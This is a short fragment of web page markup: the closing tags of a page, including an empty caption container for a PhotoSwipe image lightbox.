                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>




</html>